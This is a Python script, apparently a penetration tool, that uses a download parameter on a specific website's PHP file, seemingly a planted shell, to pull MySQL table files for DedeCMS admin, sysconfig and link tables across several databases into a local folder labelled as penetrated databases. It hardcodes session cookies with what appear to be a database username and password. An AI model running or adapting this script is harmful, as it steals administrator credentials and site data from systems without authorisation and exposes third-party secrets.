#coding:utf-8
from requests_html import HTMLSession
import requests, urllib
import os
import re

session = HTMLSession()

dbnamelist=["a25","a26","a45","a54"]

url_h="http://www.nsxfgls.com/a/yule/Teams.php?down=D%3A%2Fbeifen%2Fmysql%2F"
dede_flink_frm = "dede_flink.frm"
dede_flink_MYD = "dede_flink.MYD"
dede_flink_MYI = "dede_flink.MYI"

dede_admin_frm="dede_admin.frm"
dede_admin_MYD="dede_admin.MYD"
dede_admin_MYI="dede_admin.MYI"

dede_sysconfig_frm="dede_sysconfig.frm"
dede_sysconfig_MYD="dede_sysconfig.MYD"
dede_sysconfig_MYI="dede_sysconfig.MYI"

for dbname in dbnamelist:
    print(dbname)
    urllist=[
        ["{}%2F{}".format(dbname,dede_flink_frm),"{}%2F{}".format(dbname,dede_flink_MYD),"{}%2F{}".format(dbname,dede_flink_MYI),
        "{}%2F{}".format(dbname,dede_admin_frm),"{}%2F{}".format(dbname,dede_admin_MYD),"{}%2F{}".format(dbname,dede_admin_MYI),
        "{}%2F{}".format(dbname,dede_sysconfig_frm),"{}%2F{}".format(dbname,dede_sysconfig_MYD),"{}%2F{}".format(dbname,dede_sysconfig_MYI)]
    ]
    headers={
        "cookie":"envlpass=aafe421b8ad20fe391be17a529c844c2; serveru=www.nsxfgls.com%2Fa%2Fyule%2FTeams.php; serverp=cc11; m_eanverhost=localhost; m_eanverport=3306; m_eanverpass=wanli361361A; m_eanveruser=admin0101; PHPSESSID=atb5vu2eu0msl1pdokqlehjvs2; DedeUserID=1; DedeUserID__ckMd5=4d1f262aec2d6e6b; DedeLoginTime=1560742866; DedeLoginTime__ckMd5=69e3e4dd301d5272"
    }
    # D:\www\备份文件\渗透数据库
    my_file="D:/www/备份文件/渗透数据库/{}".format(dbname)
    my_file_name1=my_file+ "/" +dede_flink_frm
    my_file_name2=my_file+ "/" +dede_flink_MYD
    my_file_name3=my_file+ "/" +dede_flink_MYI

    my_file_name4=my_file+ "/" +dede_admin_frm
    my_file_name5=my_file+ "/" +dede_admin_MYD
    my_file_name6=my_file+ "/" +dede_admin_MYI

    my_file_name7=my_file+ "/" +dede_sysconfig_frm
    my_file_name8=my_file+ "/" +dede_sysconfig_MYD
    my_file_name9=my_file+ "/" +dede_sysconfig_MYI

    if not os.path.exists(my_file):
            os.makedirs(my_file)

    for url in urllist:
        response = session.get(url_h+url[0],headers=headers)
        txt = response.content
        with open( my_file_name1,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[1],headers=headers)
        txt = response.content
        with open( my_file_name2,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[2],headers=headers)
        txt = response.content
        with open( my_file_name3,'wb' ) as f:
            f.write(txt)
        response = session.get(url_h+url[3],headers=headers)
        txt = response.content
        with open( my_file_name4,'wb' ) as f:
            f.write(txt)
            
        response = session.get(url_h+url[4],headers=headers)
        txt = response.content
        with open( my_file_name5,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[5],headers=headers)
        txt = response.content
        with open( my_file_name6,'wb' ) as f:
            f.write(txt)
        
        response = session.get(url_h+url[6],headers=headers)
        txt = response.content
        with open( my_file_name7,'wb' ) as f:
            f.write(txt)
            
        response = session.get(url_h+url[7],headers=headers)
        txt = response.content
        with open( my_file_name8,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[8],headers=headers)
        txt = response.content
        with open( my_file_name9,'wb' ) as f:
            f.write(txt)




